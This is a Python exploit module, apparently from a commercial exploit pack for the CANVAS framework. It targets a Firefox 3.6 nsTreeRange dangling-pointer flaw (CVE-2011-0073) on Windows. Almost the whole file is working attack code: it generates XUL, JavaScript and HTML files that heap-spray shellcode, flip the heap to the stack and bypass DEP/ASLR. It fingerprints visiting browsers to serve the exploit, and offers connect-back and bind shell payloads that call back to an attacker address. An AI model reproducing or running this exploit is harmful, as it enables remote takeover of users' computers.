
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import time
from struct import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *

from exploitutils import *
from tcpexploit import *

from httpclientside import httpclientside
from libs.jsobfuscate.jsobfuscate import JSObfuscator

from pelib import PElib

######################################################################################
NAME = "Mozilla Firefox v3.6 -> 3.6.16 nsTreeRange Dangling Pointer Remote Code Execution"
DESCRIPTION = "A remote dangling pointer vulnerability in Mozilla Firefox"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='Mozilla'
DOCUMENTATION["Date public"] = "2011-05-09"
DOCUMENTATION["References"] = "http://www.mozilla.org/security/announce/2011/mfsa2011-13.html"
DOCUMENTATION["Repeatability"] = "Unlimited"                     
DOCUMENTATION['CVE'] = "CVE-2011-0073"
DOCUMENTATION['CVE Url'] = 'http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-0073'
DOCUMENTATION["Notes"] = """
This is a client-side exploit - so use it via httpserver.
Vulnerability limits shellcode options.
"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2003", "XP", "Vista", "7" ]
PROPERTY['DELIVERY'] = 'HTTP'


NOTES="""
This is a client-side exploit - USE THIS MODULE VIA HTTPSERVER
If you choose to host the exploit file on an independant webserver, then you must include the generated files as well.

-------------------------------------------------------------------------------------
WP> White Phosphorus Exploit Pack
WP> Mozilla Firefox v3.6 -> 3.6.16 nsTreeRange Dangling Pointer Remote Code Execution
-------------------------------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>
-F <filename>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: Windows XP Universal (DEP) - FF 3.6 -> 3.6.16
1: Windows Universal (DEP) - FF 3.6 -> 3.6.16

Payloads:
0: IE Inject Connect Back
1: HTTPMOSDEF SSL
2: HTTPMOSDEF PLAIN
3: Execute Command

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_mozilla_firefox_nstreerange/wp_mozilla_firefox_nstreerange.py  -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

PORT = 0
######################################################################################


# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Windows XP Universal (DEP) - FF 3.6 -> 3.6.16", (0x00000000), [WINXP]],
    1 : ["Windows Universal (ASLR + DEP) - FF 3.6 -> 3.6.16", (0x00000000), [WINALL]]
}


class theexploit(wp_exploit, httpclientside):
    ######################################################################################
    ## WP> Dialog Information
    ##########################s###########################################################
    PAYLOADS=["IE Inject Connect Back",
              "HTTPMOSDEF SSL",
              "HTTPMOSDEF PLAIN",
              "Execute Command"]

    # Clienside exploits default to HTTPMosdef PLAIN 
    DEFAULT_PAYLOAD = 2

    def __init__(self):
        wp_exploit.__init__(self)
        httpclientside.__init__(self)
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.targets = targets
        self.version = 0
        self.use_universal = True
        # We default these to false        
        self.HTTPMOSDEF = False
        self.useSSLMOSDEF = False
        self.isClientD=False    

        #self.encode_printable = True
        self.alignstack = True
        
        #self.badstring = "\x00\x09\x0a\x0b\x0c\x0d\x22\x5c"
        self.filename="".join( [ random.choice(string.uppercase) for x in range(8) ] ) + ".html"
        self.xul_filename = self.filename[0:self.filename.index('.')] + ".xul"
        self.js_filename = self.filename[0:self.filename.index('.')] + ".js" 

        self.trigger_name="".join( [ random.choice(string.uppercase) for x in range(8) ] )

        # HTTP Custom Stuff
        self.jsObfuscator = JSObfuscator()
        self.jsObfuscator.xorKeyFromCookie("SessionID")
        return

    def is_vulnerable(self, info_dict):
        # Called from ClientD, returns a value used to rank the exploit within attacking modules
        """
        Check for Firefox
        """
        self.isClientD = True
        if "Firefox/3.6" in info_dict['user_agent']:
            self.log("WP> Target has Firefox/3.6")
            language = info_dict['plugins'].get("language", "")
            if type(language)==type([]):
                language=language[0] #it's a list in actuality
            self.log("WP> language found: %s"%language)
            if "en-us" in language:
                return 95
            else:
                return 20
        return 0

    def usage(self):
        self.wp_usage(targets,"-F <filename>")
        return  

    def neededListenerTypes(self):
        self.getArgs()
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        #self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    

    def getArgs(self):
        # If Called from clientD, update shellcode accordingly
        if getattr(self,'useSSLMOSDEF',False):
            self.isClientD = True
            self.DEFAULT_PAYLOAD = 1

        else:
            # Potentially called from httpserver update shellcode accordingly        
            if self.HTTPMOSDEF:
                if self.useSSLMOSDEF:
                    self.DEFAULT_PAYLOAD = 1
                else:
                    self.DEFAULT_PAYLOAD = 2

        # Selected shell options
        self.wp_getShellcodeType()

        # If called from clientD there will be no target here
        if self.target:    
            self.host=self.target.interface

        self.filename=self.argsDict.get('filename',self.filename)
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return

    def makeXUL(self):
        # make the XUL file
                
        filedata = """<?xml version="1.0"?>
<?xml-stylesheet type="text/css"?>
<window id="example-window" xmlns:html="http://www.w3.org/1999/xhtml" xmlns="http://www.mozilla.org/keymaster/gatekeeper/there.is.only.xul">
<html:p>
Please wait for page to load....
</html:p>
<script src="JS_FILENAME"/>
<tree id="treeset" onselect="TRIGGER_NAME();" rows="6" flex="1">

  <treecols>
      <treecol id="firstname" label="." primary="true" flex="3"/>
  </treecols>

  <treechildren>
    <treeitem container="true" open="true">
      <treerow>
        <treecell label="."/>
      </treerow>
    </treeitem>
  </treechildren>

</tree>
</window>
"""
        filedata = filedata.replace('JS_FILENAME', self.js_filename )
        filedata = filedata.replace('TRIGGER_NAME', self.trigger_name)

        outputfile = wp_outputpath(self.xul_filename)
        self.log("WP> Opening XUL file %s for output"%outputfile)
        fd=file(outputfile,'wb+')
        fd.write(filedata)
        fd.close()
        return filedata

    def makeJS(self,type):        
        
        if type == 1:
            sprayaddr = pack('<L', 0x12001000)  # spray addr + pr nopslide to DEP bypass
            sprayaddr += pack('<L', 0x7C341111)
            h2sflip = pack('<L', 0x7C34E7BA)    # heap -> stack flip
            print len(self.shellcode)+8198
            depBypass = self.wp_sayonaraASLRDEPBypass((len(self.shellcode)+8198))
        else:
            sprayaddr = pack('<L', 0x0a001000)  # spray addr + pr nopslide to DEP bypass
            sprayaddr += pack('<L', 0x77C1F815)
            h2sflip = pack('<L', 0x77C3A634)    # heap -> stack flip
            depBypass = self.wp_UniversalDEPBypassWinXP_VP((len(self.shellcode)+8198))
            
        filedata = """
function TRIGGER_NAME() 
{
	var sel = document.getElementById('treeset').view.selection;

	sel.tree = {
		invalidateRange: function(s,e) {
			sel.tree = null;
			sel.clearSelection();

			var container = new Array();
			var addr = unescape("SPRAYADDY");
			var pad = unescape("PADDING");

			var big = addr;
			while (big.length < 0x38) big += addr

			big += unescape("H2SFLIP");
	                big += unescape("DEPBYPASS");
	                big += unescape("SHELLCODE");

			while (big.length < 0x50000) big += big;
			big=big.substring(0,0x50000);

			var len = big.length - pad.length - 1;
			for (i = 0; i < 400; ++i)
				container.push(big.substring(0, len) + pad);
		}
	} 
}
function TIMER()
{
	var tree = document.getElementById('treeset');
	
	tree.selected=true;
	tree.focus();
	tree.view.selection.select(0);
	alert("Waiting?");
	
}

setTimeout("TIMER()",2000);

"""
        filedata = filedata.replace('TRIGGER_NAME', self.trigger_name)
        filedata = filedata.replace('H2SFLIP',wp_urluencode(h2sflip))
        filedata = filedata.replace('SPRAYADDY',wp_urluencode(sprayaddr))
        filedata = filedata.replace('PADDING',wp_urluencode(wp_randomstring(8)))
        filedata = filedata.replace('DEPBYPASS',wp_urluencode(depBypass))
        filedata = filedata.replace('SHELLCODE',wp_urluencode(wp_randomnops(8192, self.badstring) + "\x81\xC4\x06\x20\x00\x00" + self.shellcode + (wp_randomstring(100))))
        filedata = filedata.replace('TIMER', wp_randomstring(10))

        outputfile = wp_outputpath(self.js_filename)
        self.log("WP> Opening .JS file %s for output"%outputfile)
        fd=file(outputfile,'wb+')
        fd.write(filedata)
        fd.close()
        return filedata
        
    def makeHTML(self,type):        
        
        filedata =""
        if type == 1:
            filedata = """<embed type="application/x-java-applet" code="jreVerify.class" codebase="/jsp_utils/" width="1" height="2" jumpto="/en/download/installed.jsp?" pause="2000" />
            """

        filedata += """<script>document.location="XUL_FILENAME"</script>"""
        filedata = filedata.replace('XUL_FILENAME', self.xul_filename)

        outputfile = wp_outputpath(self.filename)
        self.log("WP> Opening HTML file %s for output"%outputfile)
        fd=file(outputfile,'wb+')
        fd.write(filedata)
        fd.close()
        return filedata         

    def makefile(self,browser,osversion):   
        self.xul_filename = self.filename[0:self.filename.index('.')] + ".xul"
        self.js_filename = self.filename[0:self.filename.index('.')] + ".js"        

        if osversion == "Windows XP":
            self.log('WP> Generating Windows XP Universal exploit')
            self.makeHTML(0)
            self.makeXUL()
            self.makeJS(0)            
        else:         
            self.log('WP> Generating Windows Universal ASLR + DEP Exploit')     
            self.makeHTML(1)
            self.makeXUL()
            self.makeJS(1)
        return 

    def makesploit(self,clientheader,clientbody):
        self.createShellcode()

        # The main call from ClientD
        from libs.spkproxy import header,body

        h=header('SERVER')
        b=body()

        self.log('WP> ****************************************')
        self.log("WP> URL Received: %s"%clientheader.URL)
        user_agent  = clientheader.getStrValue(['User-Agent'])
        cookies = clientheader.getStrValue(['Cookie'])
        
        # Get details
        browser,osversion = wp_browserinfo(user_agent)
        self.log('WP> OSVersion: %s' % osversion)
        self.log('WP> Browser: %s' % browser)
        self.log('WP> ')        

        if clientheader.URL.count(self.filename):
            if cookies.count("SessionID"):
                self.log('WP> Exploit already sent to this client')
                self.log('WP> Returning blank page')
                data=""
                b.setBody(data)
                h.addHeader('Content-Type','text/html')
            else:
                self.log('WP> Serving exploit html file %s'%self.filename)
                if osversion == "Windows XP":
                    data=self.makeHTML(0)
                else:
                    data=self.makeHTML(1)
                
                if not data:
                    return None,None
                b.setBody(data)
                h.addHeader('Content-Type','text/html')
                h.addHeader('Set-Cookie','SessionID=%d' % self.jsObfuscator.getXORKey())
        elif clientheader.URL.count(self.xul_filename):
            self.log('WP> Serving exploit XUL file %s'%self.xul_filename)

            data=self.makeXUL()
            if not data:
                return None,None
            b.setBody(data)
            h.addHeader('Content-Type','application/vnd.mozilla.xul+xml')
        elif clientheader.URL.count(self.js_filename):
            self.log('WP> Serving exploit .js file %s'%self.js_filename)

            if osversion == "Windows XP":
                data=self.makeJS(0)
            else:
                data=self.makeJS(1)
            
            if not data:
                return None,None
            b.setBody(data)
            h.addHeader('Content-Type','application/x-javascript')    
        elif clientheader.URL.count("favicon.ico"):
            self.log('WP> Serving blank icon')
            b.setBody("")  
                    
        else:
            self.log('WP> Redirecting to self')
            h.status='302'
            h.addHeader('Location',self.filename)
            h.addHeader('Content-Type','text/html')

        return h,b


    def run(self):
        if self.version == 1:
            self.makefile("","")         
        else:
            self.makefile("Windows XP","")
        
        self.log("WP> Output complete")
        return 1

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
